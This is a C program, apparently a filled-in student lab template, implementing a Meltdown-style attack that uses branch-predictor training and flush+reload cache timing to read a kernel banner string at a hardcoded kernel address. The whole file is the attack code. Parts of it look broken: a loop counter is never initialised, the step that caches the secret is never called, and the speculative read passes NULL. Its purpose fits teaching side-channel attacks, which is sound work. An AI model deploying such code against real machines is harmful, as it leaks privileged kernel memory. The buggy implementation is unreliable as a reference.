#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <fcntl.h>

#include <assert.h>

#include <unistd.h>

#include <sys/mman.h>

#include <x86intrin.h>


// cache scratchpad array
typedef struct Array {
    char data[0x1000];
} Array;


// used for flush-reload
volatile Array *scratchpad;

// used for branch predictor
volatile Array *temp_scratchpad;

// memory!
volatile uint64_t *branch_variable;

// some secret string from kernel
// ffffffff82000100 R linux_proc_banner
volatile char *secret_data = (volatile char*) 0xffffffff82000100;


/* some function definitions */
void *
mmap_size(size_t size) {
    return mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
            -1, 0);
}

// allocate all memory
void
alloc_memory() {
    scratchpad = mmap_size(sizeof(Array) * 256);
    temp_scratchpad = mmap_size(sizeof(Array) * 256);
    branch_variable = mmap_size(0x1000);
}


// do meltdown; a template..
int meltdown_logic(uint64_t *branch_variable, char *target_array,
                    Array *cachepad, uint64_t idx) {
    volatile int i = 0;

    // flush branch variable from cache
    _mm_clflush(branch_variable);
    _mm_mfence();
    if (*branch_variable) {
        // excute the following line speculatively
        // will access cachepad indexed by secret[idx]
        i += cachepad[*target_array].data[0];
    }
    return i;
}



// flush all scratchpad data
void
flush_all() {
    // TODO: flush all from scratchpad
    // don't forget to run _mm_mfence();

    for (int i=0; i<256; i++) {
        _mm_clflush(&scratchpad[i].data[0]);
    }
    _mm_mfence();
}


// reload and get the fastest timing index; also returns timing
uint64_t
reload_fastest(uint64_t *p_timing) {
    uint64_t min_timing = -1ul;
    uint64_t min_idx;
    // TODO: return minimum timing index and timing (via p_timing)
    // while reloading blocks from scratchpad

    uint64_t diff;
    uint64_t start;
    uint64_t end;
    volatile char c;
    uint32_t a;

    for (int i = 0; i < 256; i++) {
        start = __rdtscp(&a);
        c = scratchpad[i].data[0];
        end = __rdtscp(&a);
        diff = end - start;
        if (diff < min_timing) {
            min_timing = diff;
            min_idx = i;
        }
    }
    *p_timing = min_timing;
    return min_idx;
}


// This function can cache the kernel banner string...
void read_version() {
    int fd = open("/proc/version", O_RDONLY);
    volatile char buf[512];
    read(fd, (char *)buf, 512);
    close(fd);
}



void
meltdown() {
    // TODO: Launch meltdown here..
    /*
     * Algorithm
     *
     * for 128 byte secret characters: (less than 128 bytes, around 90~100 bytes)
     *  1) train branch predictor to take 'true' branch
     *  2) flush all cache from scratchpd
     *  3) load secret data to cache (calling read_version())
     *  4) run meltdown
     *  5) reload cache, measure timing, and figure out a byte value of the secret
     *  6) repeat..
     *
     */

    char buffer[100];
    memset(buffer, 0, 100);

    volatile char c;

    while (1) {
        usleep(1000);

        *branch_variable = 1;
        for (int j; j < 100000; j++) {
            meltdown_logic(branch_variable, buffer, temp_scratchpad, 0);
        }
        flush_all();
        *branch_variable = 0;
        meltdown_logic(branch_variable, NULL, scratchpad, 0);

        uint64_t min_timing = 0;
        uint64_t min_index = reload_fastest(&min_timing);

        if (min_timing < 100) {
            printf("min: %d\n", min_index);
        }
    }
}

int
main() {
    alloc_memory();
    meltdown();
    return 0;
}

